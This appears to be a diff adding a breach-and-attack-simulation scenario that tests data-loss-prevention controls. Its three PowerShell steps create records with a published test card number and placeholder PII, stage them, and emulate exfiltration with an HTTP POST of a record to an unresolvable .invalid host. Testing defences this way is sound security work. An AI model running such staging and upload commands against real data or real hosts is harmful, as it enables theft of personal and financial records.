@@ -1,0 +1,164 @@
+id: collection-pii-financial-exfil
+product_line: dlp
+name: PII and Financial Record Movement Probe
+description: >
+  Telemetry-safe emulation of an adversary moving documents that contain
+  personal and financial identifiers off the endpoint. The documents hold only
+  published test values: the Luhn-valid test card number 4111 1111 1111 1111,
+  an IFSC-shaped test code, and [BAS-SIM] name and phone placeholders. The point
+  is to test whether DLP content inspection recognises and blocks identifier-
+  bearing files, not whether the endpoint can hold them.
+
+  KILL CHAIN STAGES:
+    1. Sensitive Record Creation — write synthetic documents with PII and financial identifiers (T1005)
+    2. Record Staging            — copy them into a staging folder (T1074.001)
+    3. Record Upload Attempt     — POST the staged records to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: Every identifier is a published test value or a [BAS-SIM] placeholder.
+  No real personal or account data is created, read, or sent. The destination is
+  a .invalid host that cannot resolve. Files are deleted in cleanup. Windows
+  only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - pii
+  - financial
+  - exfiltration
+  - dlp
+  - content-inspection
+  - bfsi
+  - t1005
+  - t1074
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Sensitive Record Creation (T1005)
+  # ---------------------------------------------------------------------------
+  - name: "PII Exfil 1 — Synthetic PII and Financial Record Creation (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes 10 small text records under %TEMP%\\bas_pii_<runid>. Each record carries the published Luhn-valid test card 4111 1111 1111 1111, an IFSC-shaped test code, and [BAS-SIM] name and phone placeholders. No real identifiers are used."
+    telemetry:
+      - "Sysmon EID 11: text records created under %TEMP%\\bas_pii_<runid>"
+    detection:
+      - "DLP: records containing card-number and IFSC-shaped identifiers on an endpoint outside a data-handling process"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_pii_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      foreach ($i in 1..10) {
+        $body = @(
+          "[BAS-SIM] record $i",
+          "Name: [BAS-SIM] Test Subscriber $i",
+          "Phone: +91-00000-00$('{0:d3}' -f $i)",
+          "Card: 4111 1111 1111 1111",
+          "Account IFSC: BASS0000001"
+        ) -join "`r`n"
+        Set-Content -Path (Join-Path $work ("record_{0:d2}.txt" -f $i)) -Value $body -Encoding UTF8
+      }
+      $count = @(Get-ChildItem -Path $work -File).Count
+      Write-Output "EXEC T1005: created $count synthetic record(s) with published test identifiers under $work. PII Stage 1. [BAS-SIM-PII-S1]"
+      Write-Output "FAIL: Records carrying card-number and account-code shaped identifiers were created with no DLP alert. Content inspection should classify these on write."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Record Staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "PII Exfil 2 — Record Staging into a Single Folder (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Copies the synthetic records from Stage 1 into a 'staged' subfolder of the same per-run directory. Consolidating identifier-bearing records into one folder is the staging step before transfer."
+    telemetry:
+      - "Sysmon EID 11: records copied into the staged subfolder"
+    detection:
+      - "DLP: several identifier-bearing files aggregated into one folder — staging IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_pii_$runId"
+      if (-not (Test-Path $work)) {
+        Write-Output "SKIP: T1074.001: no records from Stage 1 to stage. [BAS-SIM-PII-S2]"
+        exit 0
+      }
+      $staged = Join-Path $work 'staged'
+      New-Item -ItemType Directory -Path $staged -Force | Out-Null
+      Get-ChildItem -Path $work -File | ForEach-Object { Copy-Item $_.FullName -Destination $staged -Force }
+      $count = @(Get-ChildItem -Path $staged -File).Count
+      Write-Output "EXEC T1074.001: staged $count identifier-bearing record(s) into $staged. PII Stage 2. [BAS-SIM-PII-S2]"
+      Write-Output "FAIL: Identifier-bearing records were aggregated into a staging folder with no alert."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Record Upload Attempt to .invalid (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "PII Exfil 3 — Record Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Sends the staged synthetic records to an RFC-6761 .invalid host over HTTP. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "DLP network sensor: card-number pattern in an outbound POST body"
+    detection:
+      - "DLP network inspection: card-number and account-code patterns in outbound HTTP — exfil block expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_pii_$runId"
+      $staged = Join-Path $work 'staged'
+      $sample = Get-ChildItem -Path $staged -File | Select-Object -First 1
+      if (-not $sample) {
+        Write-Output "SKIP: T1048.003: no staged record to send. [BAS-SIM-PII-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-pii-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $sample.FullName -ContentType 'text/plain' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of a synthetic identifier-bearing record to $target. reached=$reached (expected: false). PII upload Stage 3. [BAS-SIM-PII-S3]"
+      if ($reached) {
+        Write-Output "FAIL: An identifier-bearing record was delivered to an unknown host. DLP content inspection on outbound HTTP is not blocking card-number and account-code patterns."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send an identifier-bearing record to an unknown host with no content block. Unreachable only because the domain is .invalid; DLP should have stopped the request before it left."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_pii_*') -Recurse -Force -ErrorAction SilentlyContinue
